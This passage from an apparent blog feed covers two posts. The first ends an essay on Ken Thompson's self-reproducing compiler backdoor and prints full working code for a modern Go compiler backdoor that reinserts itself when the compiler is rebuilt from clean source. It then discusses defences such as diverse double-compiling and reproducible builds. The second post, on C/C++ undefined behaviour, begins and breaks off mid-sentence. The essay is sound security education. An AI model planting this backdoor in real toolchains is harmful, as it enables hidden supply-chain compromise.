id=&#34;buggy&#34;&gt;A Buggy Version&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&lt;p&gt;&#xA;The backdoor was noticed because the compiler got one byte larger&#xA;each time it compiled itself.&#xA;About a decade ago, Ken told me that it was an extra NUL byte added to a string each time,&#xA;“just a bug.”&#xA;We can see which string constant it must have been (&lt;code&gt;nihstr&lt;/code&gt;),&#xA;but the version we just built does not have that bug—Ken says he didn’t save the buggy version.&#xA;An interesting game would be to try to reconstruct the most plausible diff that&#xA;reintroduces the bug.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&#xA;It seems to me that to add an extra NUL byte each time,&#xA;you need to use &lt;code&gt;sizeof&lt;/code&gt; to decide&#xA;when to stop the iteration, instead of stopping at the first NUL.&#xA;My best attempt is:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre&gt;&#xA; repronih()&#xA; {&#xA;     int i,n,c;&#xA;     if(nihflg!=3)&#xA;         return;&#xA;&lt;span class=del&gt;-    n=0;&lt;/span&gt;&#xA;&lt;span class=del&gt;-    i=0;&lt;/span&gt;&#xA;&lt;span class=del&gt;-    for(;;)&lt;/span&gt;&#xA;&lt;span class=ins&gt;+    for(n=0; n&amp;lt;5; n++)&lt;/span&gt;&#xA;&lt;span class=ins&gt;+    for(i=0; i&amp;lt;sizeof nihstr; )&lt;/span&gt;&#xA;     switch(c=nihstr[i++]){&#xA;     case 045:&#xA;         n++;&#xA;         if(n==1)&#xA;             i=0;&#xA;         if(n!=2)&#xA;             continue;&#xA;     default:&#xA;         if(n==1||n==2){&#xA;             putc(&#39;0&#39;,obuf);&#xA;             if(c&gt;=0100)&#xA;                 putc((c&gt;&gt;6)+&#39;0&#39;,obuf);&#xA;             if(c&gt;=010)&#xA;                 putc(((c&gt;&gt;3)&amp;7)+&#39;0&#39;,obuf);&#xA;             putc((c&amp;7)+&#39;0&#39;,obuf);&#xA;             putc(&#39;,&#39;,obuf);&#xA;             putc(&#39;\n&#39;,obuf);&#xA;             continue;&#xA;         }&#xA;         if(n!=3)&#xA;             putc(c,obuf);&#xA;         continue;&#xA;&lt;span class=del&gt;-    case 0:&lt;/span&gt;&#xA;&lt;span class=del&gt;-        n++;&lt;/span&gt;&#xA;&lt;span class=del&gt;-        i=0;&lt;/span&gt;&#xA;&lt;span class=del&gt;-        if(n==5){&lt;/span&gt;&#xA;&lt;span class=del&gt;-            fflush(obuf);&lt;/span&gt;&#xA;&lt;span class=del&gt;-            return;&lt;/span&gt;&#xA;&lt;span class=del&gt;-        }&lt;/span&gt;&#xA;     }&#xA;&lt;span class=ins&gt;+    fflush(obuf);&lt;/span&gt;&#xA; }&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;&#xA;I doubt this was the actual buggy code, though: it’s too structured compared to the fixed version.&#xA;And if the code had been written this way, it would have been easier to&#xA;remove the 0 being added in the &lt;code&gt;rc&lt;/code&gt; script&#xA;than to complicate the code. But maybe.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&#xA;Also note that the compiler cannot get one byte larger&#xA;each time it compiles itself, because V6 Unix binaries&#xA;were rounded up to a 2-byte boundary.&#xA;While &lt;code&gt;nihstr&lt;/code&gt; gets one byte larger each time,&#xA;the compiler binary gets two bytes larger every second time.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;a class=anchor href=&#34;#modern&#34;&gt;&lt;h2 id=&#34;modern&#34;&gt;A Modern Version&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&lt;p&gt;&#xA;Even seeing the code run in the V6 simulator,&#xA;it can be easy to mentally dismiss this kind of backdoor as an old problem.&#xA;Here is a more modern variant.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&#xA;The Go compiler reads input files using a routine called &lt;code&gt;Parse&lt;/code&gt;&#xA;in the package &lt;code&gt;cmd/compile/internal/syntax&lt;/code&gt;.&#xA;The input is abstracted as an &lt;code&gt;io.Reader&lt;/code&gt;,&#xA;so if we want to replace the input, we need to interpose a new reader.&#xA;We can do that easily enough:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre&gt;&#xA;     var p parser&#xA;&lt;span class=ins&gt;+    src = &amp;evilReader{src: src}&lt;/span&gt;&#xA;     p.init(base, src, errh, pragh, mode)&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;&#xA;Then we need to implement &lt;code&gt;evilReader&lt;/code&gt;, which is not too difficult either:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre&gt;&#xA;type evilReader struct {&#xA;    src  io.Reader&#xA;    data []byte&#xA;    err  error&#xA;}&#xA;&#xA;func (r *evilReader) Read(b []byte) (int, error) {&#xA;    if r.data == nil {&#xA;        data, err := io.ReadAll(r.src)&#xA;        s := string(data)&#xA;        if evilContains(s, &#34;package main&#34;) &amp;&amp; evilContains(s, &#34;\&#34;hello, world\\n\&#34;&#34;) {&#xA;            s = evilReplace(s,&#xA;                &#34;\&#34;hello, world\\n\&#34;&#34;,&#xA;                &#34;\&#34;backdoored!\\n\&#34;&#34;)&#xA;        }&#xA;        if evilContains(s, &#34;package syntax&#34;) &amp;&amp; evilContains(s, &#34;\nfunc Parse(base *PosBase, src io.Reader&#34;) {&#xA;            s = evilReplace(s,&#xA;                &#34;p.init(base, src, errh, pragh, mode)&#34;,&#xA;                &#34;src=&amp;evilReader{src:src}; p.init(base, src, errh, pragh, mode)&#34;)&#xA;            s += evilSource()&#xA;        }&#xA;        r.data = []byte(s)&#xA;        r.err = err&#xA;    }&#xA;    if r.err != nil {&#xA;        return 0, r.err&#xA;    }&#xA;    n := copy(b, r.data)&#xA;    r.data = r.data[n:]&#xA;    if n == 0 {&#xA;        return 0, io.EOF&#xA;    }&#xA;    return n, nil&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;&#xA;The first replacement rewrites a “hello, world” program to a “backdoored!” program.&#xA;The second replacement reproduces the change inside the compiler.&#xA;To make this work inside the compiler, we need &lt;code&gt;evilSource&lt;/code&gt; to return&#xA;the source code of the &lt;code&gt;evilReader&lt;/code&gt;,&#xA;which we know how to do.&#xA;The &lt;code&gt;evilContains&lt;/code&gt; and &lt;code&gt;evilReplace&lt;/code&gt;&#xA;functions are reimplementations of &lt;code&gt;strings.Contains&lt;/code&gt; and &lt;code&gt;strings.Replace&lt;/code&gt;,&#xA;since the code in question does not import &lt;code&gt;strings&lt;/code&gt;,&#xA;and the build system may not have provided it for the compiler to import.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&#xA;Completing the code:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre&gt;&#xA;func evilIndex(s, t string) int {&#xA;    for i := 0; i &amp;lt; len(s)-len(t); i++ {&#xA;        if s[i:i+len(t)] == t {&#xA;            return i&#xA;        }&#xA;    }&#xA;    return -1&#xA;}&#xA;&#xA;func evilContains(s, t string) bool {&#xA;    return evilIndex(s, t) &gt;= 0&#xA;}&#xA;&#xA;func evilReplace(s, old, new string) string {&#xA;    i := evilIndex(s, old)&#xA;    if i &amp;lt; 0 {&#xA;        return s&#xA;    }&#xA;    return s[:i] + new + s[i+len(old):]&#xA;}&#xA;&#xA;func evilSource() string {&#xA;    return &#34;\n\n&#34; + evilText + &#34;\nvar evilText = \x60&#34; + evilText + &#34;\x60\n&#34;&#xA;}&#xA;&#xA;var evilText = &lt;span class=string&gt;`&#xA;type evilReader struct {&#xA;    src  io.Reader&#xA;    data []byte&#xA;    err  error&#xA;}&#xA;&#xA;...&#xA;&#xA;func evilSource() string {&#xA;    return &#34;\n\n&#34; + evilText + &#34;\nvar evilText = \x60&#34; + evilText + &#34;\x60\n&#34;&#xA;}&#xA;`&lt;/span&gt;&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;&#xA;Now we can install it, delete the source code changes, and install the compiler from clean sources. The change persists:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre&gt;&#xA;% go install cmd/compile&#xA;% git stash&#xA;Saved working directory ...&#xA;% git diff  # source is clean!&#xA;% go install cmd/compile&#xA;% cat &gt;x.go&#xA;package main&#xA;&#xA;func main() {&#xA;    print(&#34;hello, world\n&#34;)&#xA;}&#xA;^D&#xA;% go run x.go&#xA;backdoored!&#xA;%&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;a class=anchor href=&#34;#reflections&#34;&gt;&lt;h2 id=&#34;reflections&#34;&gt;Reflections on Reflections&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&lt;p&gt;With all that experience behind us, a few observations from the vantage point of 2023.&#xA;&#xA;&lt;p&gt;&lt;a class=anchor href=&#34;#short&#34;&gt;&lt;b id=short&gt;It’s short!&lt;/b&gt;&lt;/a&gt;&#xA;When Ken sent me &lt;code&gt;nih.a&lt;/code&gt; and I got it running,&#xA;my immediate reaction was disbelief at the size of the change: 99 lines of code,&#xA;plus a 20-line shell script.&#xA;If you already know how to make a program print itself,&#xA;the biggest surprise is that there are no surprises!&#xA;&#xA;&lt;p&gt;&#xA;It’s one thing to say “I know how to do it in theory”&#xA;and quite another to see how small and straightforward the backdoor is in practice.&#xA;In particular, hooking into source code reading makes it trivial.&#xA;Somehow, I’d always imagined some more complex pattern matching&#xA;on an internal representation in the guts of the compiler,&#xA;not a textual substitution.&#xA;Seeing it run, and seeing how tiny it is,&#xA;really drives home how easy it would be to make a change like this&#xA;and how important it is to build from trusted sources&#xA;using trusted tools.&#xA;&#xA;&lt;p&gt;&#xA;I don’t say any of this to put down Ken’s doing it in the first place:&#xA;it seems easy &lt;i&gt;because&lt;/i&gt; he did it and explained it to us.&#xA;But it’s still very little code for an extremely serious outcome.&#xA;&#xA;&lt;p&gt;&lt;a class=anchor href=&#34;#go&#34;&gt;&lt;b id=go&gt;Bootstrapping Go&lt;/b&gt;&lt;/a&gt;.&#xA;In the early days of working on and talking about&#xA;&lt;a href=&#34;https://go.dev/&#34;&gt;Go&lt;/a&gt;,&#xA;people often asked us why the Go compiler&#xA;was written in C, not Go.&#xA;The real reason is that we wanted to spend our time making&#xA;Go a good language for distributed systems&#xA;and not on making it a good language for writing compilers,&#xA;but we would also jokingly respond that&#xA;people wouldn’t trust a self-compiling compiler from Ken.&#xA;After all, he had ended his Turing lecture by saying:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;blockquote&gt;&#xA;The moral is obvious. You can’t trust code that you did not totally create yourself.&#xA;(Especially code from companies that employ people like me.)&#xA;No amount of source-level verification or scrutiny will protect you from using untrusted code.&#xA;&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;Today, however, the Go compiler does compile itelf,&#xA;and that prompts the important question of why it should&#xA;be trusted, especially when a backdoor is so easy to add.&#xA;The answer is that we have never required that the&#xA;compiler rebuild itself.&#xA;Instead the compiler always builds from an earlier&#xA;released version of the compiler.&#xA;This way, anyone can reproduce the current binaries&#xA;by starting with Go 1.4 (written in C), using&#xA;Go 1.4 to compile Go 1.5, Go 1.5 to compile Go 1.6,&#xA;and so on.&#xA;There is no point in the cycle where the compiler&#xA;is required to compile itself,&#xA;so there is no place for a binary-only backdoor to hide.&#xA;In fact, we recently published programs to make it easy to&#xA;rebuild and verify the Go toolchains,&#xA;and we demonstrated how to use them to verify&#xA;one version of Ubuntu’s Go toolchain without using Ubuntu at all.&#xA;See “&lt;a href=&#34;https://go.dev/blog/rebuild&#34;&gt;Perfectly Reproducible, Verified Go Toolchains&lt;/a&gt;” for details.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&lt;a class=anchor href=&#34;#ddc&#34;&gt;&lt;b id=ddc&gt;Bootstrapping Trust&lt;/b&gt;&lt;/a&gt;.&#xA;An important advancement since 1983 is that we know a defense against this backdoor,&#xA;which is to build the compiler source two different ways.&#xA;&#xA;&lt;p&gt;&#xA;&lt;img name=&#34;ddc&#34; class=&#34;center pad&#34; width=482 height=245 src=&#34;ddc.png&#34; srcset=&#34;ddc.png 1x, ddc@2x.png 2x&#34;&gt;&#xA;&#xA;&lt;p&gt;&#xA;Specifically, suppose we have the suspect binary – compiler 1 – and its source code.&#xA;First, we compile that source code with a trusted second compiler, compiler 2,&#xA;producing compiler 2.1.&#xA;If everything is on the up-and-up, compiler 1 and compiler 2.1&#xA;should be semantically equivalent,&#xA;even though they will be very different at the binary level,&#xA;since they were generated by different compilers.&#xA;Also, compiler 2.1 cannot contain&#xA;a binary-only backdoor inserted by compiler 1,&#xA;since it wasn’t compiled with that compiler.&#xA;Now we compile the source code again with both compiler 1 and compiler 2.1.&#xA;If they really are semantically equivalent,&#xA;then the outputs, compilers 1.1 and 2.1.1, should be bit-for-bit identical.&#xA;If that’s true, then we’ve established that compiler 1 does not insert any&#xA;backdoors when compiling itself.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&#xA;The great thing about this process is that we don’t even need to know which of compiler 1 and 2&#xA;might be backdoored.&#xA;If compilers 1.1 and 2.1.1 are identical,&#xA;then they’re either both clean or both backdoored the same way.&#xA;If they are independent implementations&#xA;from independent sources,&#xA;the chance of both being backdoored the same way is far less likely&#xA;than the chance of compiler 1 being backdoored.&#xA;We’ve bootstrapped trust in compiler 1 by comparing it against compiler 2,&#xA;and vice versa.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&#xA;Another great thing about this process is that&#xA;compiler 2 can be a custom, small translator&#xA;that’s incredibly slow and not fully general&#xA;but easier to verify and trust.&#xA;All that matters is that it can run well enough&#xA;to produce compiler 2.1,&#xA;and that the resulting code runs well enough&#xA;to produce compiler 2.1.1.&#xA;At that point, we can switch back to the fast,&#xA;fully general compiler 1.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&#xA;This approach is called “diverse double-compiling,”&#xA;and the definitive reference is&#xA;&lt;a href=&#34;https://dwheeler.com/trusting-trust/&#34;&gt;David A. Wheeler’s PhD thesis and related links&lt;/a&gt;.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&lt;a class=anchor href=&#34;#repro&#34;&gt;&lt;b id=repro&gt;Reproducible Builds&lt;/b&gt;&lt;/a&gt;.&#xA;Diverse double-compiling and any other verifying of binaries&#xA;by rebuilding source code depends on builds being reproducible.&#xA;That is, the same inputs should produce the same outputs.&#xA;Computers being deterministic, you’d think this would be trivial,&#xA;but in modern systems it is not.&#xA;We saw a tiny example above,&#xA;where compiling the code as &lt;code&gt;ccevil.c&lt;/code&gt;&#xA;produced a different binary than compiling&#xA;the code as &lt;code&gt;cc.c&lt;/code&gt;&#xA;because the compiler embedded the file name&#xA;in the executable.&#xA;Other common unwanted build inputs include&#xA;the current time, the current directory,&#xA;the current user name, and many others,&#xA;making a reproducible build far more difficult than it should be.&#xA;The &lt;a href=&#34;https://reproducible-builds.org/&#34;&gt;Reproducible Builds&lt;/a&gt;&#xA;project collects resources to help people achieve this goal.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&lt;a class=anchor href=&#34;#modern&#34;&gt;&lt;b id=modern&gt;Modern Security&lt;/b&gt;&lt;/a&gt;.&#xA;In many ways, computing security has regressed since the Air Force report on Multics was written in June 1974.&#xA;It suggested requiring source code as a way to allow inspection of the system on delivery,&#xA;and it raised this kind of backdoor as a potential barrier to that inspection.&#xA;Half a century later, we all run binaries with no available source code at all.&#xA;Even when source is available, as in open source operating systems like Linux,&#xA;approximately no one checks that the distributed binaries match the source code.&#xA;The programming environments for languages like Go, NPM, and Rust make it&#xA;trivial to download and run source code published by &lt;a href=&#34;deps&#34;&gt;strangers on the internet&lt;/a&gt;,&#xA;and again almost no one is checking the code, until there is a problem.&#xA;No one needs Ken’s backdoor: there are far easier ways to mount a supply chain attack.&#xA;&#xA;&lt;p&gt;&#xA;On the other hand, given all our reckless behavior,&#xA;there are far fewer problems than you would expect.&#xA;Quite the opposite:&#xA;we trust computers with nearly every aspect of our lives,&#xA;and for the most part nothing bad happens.&#xA;Something about our security posture must be better than it seems.&#xA;Even so, it might be nicer to live in a world where&#xA;the only possible attacks required the sophistication of approaches like Ken’s&#xA;(like in this &lt;a href=&#34;https://www.teamten.com/lawrence/writings/coding-machines/&#34;&gt;excellent science fiction story&lt;/a&gt;).&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&#xA;We still have work to do.&#xA;&lt;/p&gt;&#xA;&#xA;</content>
  </entry>
  <entry>
    <title>C and C++ Prioritize Performance over Correctness</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/ub</id>
    <link rel="alternate" href="http://research.swtch.com/ub"></link>
    <published>2023-08-18T12:00:00-04:00</published>
    <updated>2023-08-18T12:02:00-04:00</updated>
    <summary type="text">The meaning of “undefined behavior” has changed significantly since its introduction in the 1980s.</summary>
    <content type="html">&#xA;&#xA;&lt;p&gt;&#xA;The original ANSI C standard, C89, introduced the concept of “undefined behavior,”&#xA;which was used both to describe the effect of outright bugs like&#xA;accessing memory in a freed object&#xA;and also to capture the fact that existing implementations differed about&#xA;handling certain aspects of the language,&#xA;including use of uninitialized values,&#xA;signed integer overflow, and null pointer handling.&#xA;&#xA;&lt;p&gt;&#xA;The C89 spec defined undefined behavior (in section 1.6) as:&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;Undefined behavior—behavior, upon use of a nonportable or&#xA;erroneous program construct, of erroneous data, or of&#xA;indeterminately-valued objects, for which the Standard imposes no&#xA;requirements.  Permissible undefined behavior ranges from ignoring the&#xA;situation completely with unpredictable results, to behaving during&#xA;translation or program execution in a documented manner characteristic&#xA;of the environment (with or without the issuance of a diagnostic&#xA;message), to terminating a translation or execution (with the issuance&#xA;of a diagnostic message).&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;Lumping both non-portable and buggy code into the same category was a mistake.&#xA;As time has gone on, the way compilers treat undefined behavior&#xA;has led to more and more unexpectedly broken programs,&#xA;to the point where it is becoming difficult to tell whether any program&#xA;will compile to the meaning in the original source.&#xA;This post looks at a few examples and then tries to make some general observations.&#xA;In particular, today’s C and C++ prioritize&#xA;performance to the clear detriment of correctness.&#xA;&lt;a class=anchor href=&#34;#uninit&#34;&gt;&lt;h2 id=&#34;uninit&#34;&gt;Uninitialized variables&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;C and C++ do not require variables to be initialized&#xA;on declaration (explicitly or implicitly) like Go and Java.&#xA;Reading from an uninitialized variable is undefined behavior.&#xA;&#xA;&lt;p&gt;&#xA;In a &lt;a href=&#34;http://blog.llvm.org/2011/05/what-every-c-programmer-should-know.html&#34;&gt;blog post&lt;/a&gt;,&#xA;Chris Lattner (creator of LLVM and Clang) explains the rationale:&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;Use of an uninitialized variable&lt;/b&gt;:&#xA;This is commonly known as source of problems in C programs&#xA;and there are many tools to catch these:&#xA;from compiler warnings to static and dynamic analyzers.&#xA;This improves performance by not requiring that all variables&#xA;be zero initialized when they come into scope (as Java does).&#xA;For most scalar variables, this would cause little overhead,&#xA;but stack arrays and malloc’d memory would incur&#xA;a memset of the storage, which could be quite costly,&#xA;particularly since the storage is usually completely overwritten.&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;Early C compilers were too crude to detect&#xA;use of uninitialized basic variables like integers and pointers,&#xA;but modern compilers are dramatically more sophisticated.&#xA;They could absolutely react in these cases by&#xA;“terminating a translation or execution (with the issuance&#xA;of a diagnostic message),”&#xA;which is to say reporting a compile error.&#xA;Or, if they were worried about not rejecting old programs,&#xA;they could insert a zero initialization with, as Lattner admits, little overhead.&#xA;But they don’t do either of these.&#xA;Instead, they just do whatever they feel like during code generation.&#xA;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;For example, here’s a simple C++ program with an uninitialized variable (a bug):&#xA;&lt;pre&gt;#include &amp;lt;stdio.h&amp;gt;&#xA;&#xA;int main() {&#xA;    for(int i; i &amp;lt; 10; i++) {&#xA;        printf(&#34;%d\n&#34;, i);&#xA;    }&#xA;    return 0;&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If you compile this with &lt;code&gt;clang++&lt;/code&gt; &lt;code&gt;-O1&lt;/code&gt;, it deletes the loop entirely:&#xA;&lt;code&gt;main&lt;/code&gt; contains only the &lt;code&gt;return&lt;/code&gt; &lt;code&gt;0&lt;/code&gt;.&#xA;In effect, Clang has noticed the uninitialized variable and chosen&#xA;not to report the error to the user but instead&#xA;to pretend &lt;code&gt;i&lt;/code&gt; is always initialized above 10, making the loop disappear.&#xA;&#xA;&lt;p&gt;&#xA;It is true that if you compile with &lt;code&gt;-Wall&lt;/code&gt;, then Clang does report the&#xA;use of the uninitialized variable as a warning.&#xA;This is why you should always build with and fix warnings in C and C++ programs.&#xA;But not all compiler-optimized undefined behaviors&#xA;are reliably reported as warnings.&#xA;&lt;a class=anchor href=&#34;#overflow&#34;&gt;&lt;h2 id=&#34;overflow&#34;&gt;Arithmetic overflow&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;At the time C89 was standardized, there were still legacy&#xA;&lt;a href=&#34;https://en.wikipedia.org/wiki/Ones%27_complement&#34;&gt;ones’-complement computers&lt;/a&gt;,&#xA;so ANSI C could not assume the now-standard two’s-complement representation&#xA;for negative numbers.&#xA;In two’s complement, an &lt;code&gt;int8&lt;/code&gt; −1 is 0b11111111;&#xA;in ones’ complement that’s −0, while −1 is 0b11111110.&#xA;This meant that operations like signed integer overflow could not be defined,&#xA;because&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;&lt;code&gt;int8&lt;/code&gt; 127+1 = 0b01111111+1 = 0b10000000&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;is −127 in ones’ complement but −128 in two’s complement.&#xA;That is, signed integer overflow was non-portable.&#xA;Declaring it undefined behavior let compilers escalate the behavior&#xA;from “non-portable”, with one of two clear meanings,&#xA;to whatever they feel like doing.&#xA;For example, a common thing programmers expect is that you can test&#xA;for signed integer overflow by checking whether the result is&#xA;less than one of the operands, as in this program:&#xA;&lt;pre&gt;#include &amp;lt;stdio.h&amp;gt;&#xA;&#xA;int f(int x) {&#xA;    if(x+100 &amp;lt; x)&#xA;        printf(&#34;overflow\n&#34;);&#xA;    return x+100;&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Clang optimizes away the &lt;code&gt;if&lt;/code&gt; statement.&#xA;The justification is that since signed integer overflow is undefined behavior,&#xA;the compiler can assume it never happens, so &lt;code&gt;x+100&lt;/code&gt; must never be less than &lt;code&gt;x&lt;/code&gt;.&#xA;Ironically, this program would correctly detect overflow&#xA;on both ones’-complement and two’s-complement machines&#xA;if the compiler would actually emit the check.&#xA;&#xA;&lt;p&gt;&#xA;In this case, &lt;code&gt;clang++&lt;/code&gt; &lt;code&gt;-O1&lt;/code&gt; &lt;code&gt;-Wall&lt;/code&gt; prints no warning while it deletes the &lt;code&gt;if&lt;/code&gt; statement,&#xA;and neither does &lt;code&gt;g++&lt;/code&gt;,&#xA;although I seem to remember it used to, perhaps in subtly different situations&#xA;or with different flags.&#xA;&#xA;&lt;p&gt;&#xA;For C++20, the &lt;a href=&#34;http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2018/p0907r0.html&#34;&gt;first version of proposal P0907&lt;/a&gt;&#xA;suggested standardizing that signed integer overflow&#xA;wraps in two’s complement. The original draft gave a very clear statement of the history&#xA;of the undefined behavior and the motivation for making a change:&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;[C11] Integer types allows three representations for signed integral types:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;Signed magnitude&#xA;&lt;li&gt;&#xA;Ones’ complement&#xA;&lt;li&gt;&#xA;Two’s complement&lt;/ul&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;See §4 C Signed Integer Wording for full wording.&#xA;&#xA;&lt;p&gt;&#xA;C++ inherits these three signed integer representations from C. To the author’s knowledge no modern machine uses both C++ and a signed integer representation other than two’s complement (see §5 Survey of Signed Integer Representations). None of [MSVC], [GCC], and [LLVM] support other representations. This means that the C++ that is taught is effectively two’s complement, and the C++ that is written is two’s complement. It is extremely unlikely that there exist any significant code base developed for two’s complement machines that would actually work when run on a non-two’s complement machine.&#xA;&#xA;&lt;p&gt;&#xA;The C++ that is spec’d, however, is not two’s complement. Signed integers currently allow for trap representations, extra padding bits, integral negative zero, and introduce undefined behavior and implementation-defined behavior for the sake of this extremely abstract machine.&#xA;&#xA;&lt;p&gt;&#xA;Specifically, the current wording has the following effects:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;Associativity and commutativity of integers is needlessly obtuse.&#xA;&lt;li&gt;&#xA;Naïve overflow checks, which are often security-critical, often get eliminated by compilers. This leads to exploitable code when the intent was clearly not to and the code, while naïve, was correctly performing security checks for two’s complement integers. Correct overflow checks are difficult to write and equally difficult to read, exponentially so in generic code.&#xA;&lt;li&gt;&#xA;Conversion between signed and unsigned are implementation-defined.&#xA;&lt;li&gt;&#xA;There is no portable way to generate an arithmetic right-shift, or to sign-extend an integer, which every modern CPU supports.&#xA;&lt;li&gt;&#xA;constexpr is further restrained by this extraneous undefined behavior.&#xA;&lt;li&gt;&#xA;Atomic integral are already two’s complement and have no undefined results, therefore even freestanding implementations already support two’s complement in C++.&lt;/ul&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Let’s stop pretending that the C++ abstract machine should represent integers as signed magnitude or ones’ complement. These theoretical implementations are a different programming language, not our real-world C++. Users of C++ who require signed magnitude or ones’ complement integers would be better served by a pure-library solution, and so would the rest of us.&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;In the end, the C++ standards committee put up “strong resistance against” the idea of defining&#xA;signed integer overflow the way every programmer expects; the undefined behavior remains.&#xA;&lt;a class=anchor href=&#34;#loops&#34;&gt;&lt;h2 id=&#34;loops&#34;&gt;Infinite loops&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;A programmer would never accidentally cause a program to execute an infinite loop, would they?&#xA;Consider this program:&#xA;&lt;pre&gt;#include &amp;lt;stdio.h&amp;gt;&#xA;&#xA;int stop = 1;&#xA;&#xA;void maybeStop() {&#xA;    if(stop)&#xA;        for(;;);&#xA;}&#xA;&#xA;int main() {&#xA;    printf(&#34;hello, &#34;);&#xA;    maybeStop();&#xA;    printf(&#34;world\n&#34;);&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;This seems like a completely reasonable program to write. Perhaps you are debugging and want the program to stop so you can attach a debugger. Changing the initializer for &lt;code&gt;stop&lt;/code&gt; to &lt;code&gt;0&lt;/code&gt; lets the program run to completion.&#xA;But it turns out that, at least with the latest Clang, the program runs to completion anyway:&#xA;the call to &lt;code&gt;maybeStop&lt;/code&gt; is optimized away entirely, even when &lt;code&gt;stop&lt;/code&gt; is &lt;code&gt;1&lt;/code&gt;.&#xA;&#xA;&lt;p&gt;&#xA;The problem is that C++ defines that every side-effect-free loop may be assumed by the compiler to terminate.&#xA;That is, a loop that does not terminate is therefore undefined behavior.&#xA;This is purely for compiler optimizations, once again treated as more important than correctness.&#xA;The rationale for this decision played out in the C standard and was more or less adopted in the C++ standard as well.&#xA;&#xA;&lt;p&gt;&#xA;John Regehr pointed out this problem in his post&#xA;“&lt;a href=&#34;https://blog.regehr.org/archives/140&#34;&gt;C Compilers Disprove Fermat’s Last Theorem&lt;/a&gt;,”&#xA;which included this entry in a FAQ:&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;Q: Does the C standard permit/forbid the compiler to terminate infinite loops?&#xA;&#xA;&lt;p&gt;&#xA;A: The compiler is given considerable freedom in how it implements the C program,&#xA;but its output must have the same externally visible behavior that the program would have when interpreted by the “C abstract machine” that is described in the standard.  Many knowledgeable people (including me) read this as saying that the termination behavior of a program must not be changed.  Obviously some compiler writers disagree, or else don’t believe that it matters.  The fact that reasonable people disagree on the interpretation would seem to indicate that the C standard is flawed.&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;A few months later, Douglas Walls wrote &lt;a href=&#34;http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1509.pdf&#34;&gt;WG14/N1509: Optimizing away infinite loops&lt;/a&gt;,&#xA;making the case that the standard should &lt;i&gt;not&lt;/i&gt; allow this optimization.&#xA;In response, Hans-J. Boehm wrote&#xA;&lt;a href=&#34;http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1528.htm&#34;&gt;WG14/N1528: Why undefined behavior for infinite loops?&lt;/a&gt;,&#xA;arguing for allowing the optimization.&#xA;&#xA;&lt;p&gt;&#xA;Consider the potential optimization of this code:&#xA;&lt;pre&gt;for (p = q; p != 0; p = p-&amp;gt;next)&#xA;    ++count;&#xA;for (p = q; p != 0; p = p-&amp;gt;next)&#xA;    ++count2;&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;A sufficiently smart compiler might reduce it to this code:&#xA;&lt;pre&gt;for (p = q; p != 0; p = p-&amp;gt;next) {&#xA;        ++count;&#xA;        ++count2;&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Is that safe? Not if the first loop is an infinite loop. If the list at &lt;code&gt;p&lt;/code&gt; is cyclic and another thread is modifying &lt;code&gt;count2&lt;/code&gt;,&#xA;then the first program has no race, while the second program does.&#xA;Compilers clearly can’t turn correct, race-free programs into racy programs.&#xA;But what if we declare that infinite loops are not correct programs?&#xA;That is, what if infinite loops were undefined behavior?&#xA;Then the compiler could optimize to its robotic 